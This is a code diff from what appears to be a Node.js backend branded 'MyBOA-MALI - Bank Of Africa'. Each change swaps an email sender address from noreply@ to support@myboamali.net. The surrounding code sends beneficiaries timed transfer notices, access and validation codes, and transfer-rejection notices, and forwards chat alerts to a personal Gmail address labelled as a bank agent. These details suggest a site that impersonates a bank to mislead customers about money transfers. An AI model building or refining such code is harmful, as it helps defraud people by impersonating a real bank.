@@ -296,7 +296,7 @@ Ce virement est actuellement <strong>en attente de traitement</strong>. Les fond
         // Envoyer l'email après 4 minutes
         setTimeout(function() {
             const emailData = JSON.stringify({
-                sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
+                sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'support@myboamali.net' },
                 to: [{ email: email_beneficiaire, name: nom_beneficiaire }],
                 subject: 'MyBOA-MALI - Avis de virement en votre faveur - Ref: ' + reference,
                 htmlContent: htmlContent,
@@ -397,7 +397,7 @@ app.post('/send-certicode', (req, res) => {
         </html>`;
 
         const emailData = JSON.stringify({
-            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
+            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'support@myboamali.net' },
             to: [{ email: identifier, name: 'Bank of Africa' }],
             subject: 'MyBOA-MALI - Votre code d acces securise',
             htmlContent: htmlContent
@@ -555,7 +555,7 @@ app.post('/api/transfers/request-certicode', (req, res) => {
 
         const certicodeRecipientEmail = userEmail || CERTICODE_EMAIL;
         const emailData = JSON.stringify({
-            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
+            sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'support@myboamali.net' },
             to: [{ email: certicodeRecipientEmail, name: 'Client MyBOA-MALI' }],
             subject: 'MyBOA-MALI - Certicode de validation virement',
             htmlContent: htmlContent
@@ -914,7 +914,7 @@ Le montant n a pas ete credite sur votre compte et sera reverse sur le compte de
 </html>`;
 
                         const emailRejetData = JSON.stringify({
-                            sender: { name: 'MyBOA-MALI', email: 'noreply@myboamali.net' },
+                            sender: { name: 'MyBOA-MALI', email: 'support@myboamali.net' },
                             to: [{ email: vir.email_beneficiaire, name: vir.nom_beneficiaire }],
                             subject: 'MyBOA-MALI - Avis de rejet de virement - Ref: ' + vir.reference,
                             htmlContent: htmlRejet
@@ -1079,7 +1079,7 @@ function sendAgentEmailNotification(userDisplayName, userInitiales, userId, conv
     </html>`;
 
     const emailData = JSON.stringify({
-        sender: { name: 'MyBOA-MALI Chat Alert', email: 'noreply@myboamali.net' },
+        sender: { name: 'MyBOA-MALI Chat Alert', email: 'support@myboamali.net' },
         to: [{ email: 'bankof739@gmail.com', name: 'Agent MyBOA-MALI' }],
         subject: 'Nouveau message chat MyBOA-MALI - ' + (userDisplayName || userId),
         htmlContent: htmlContent
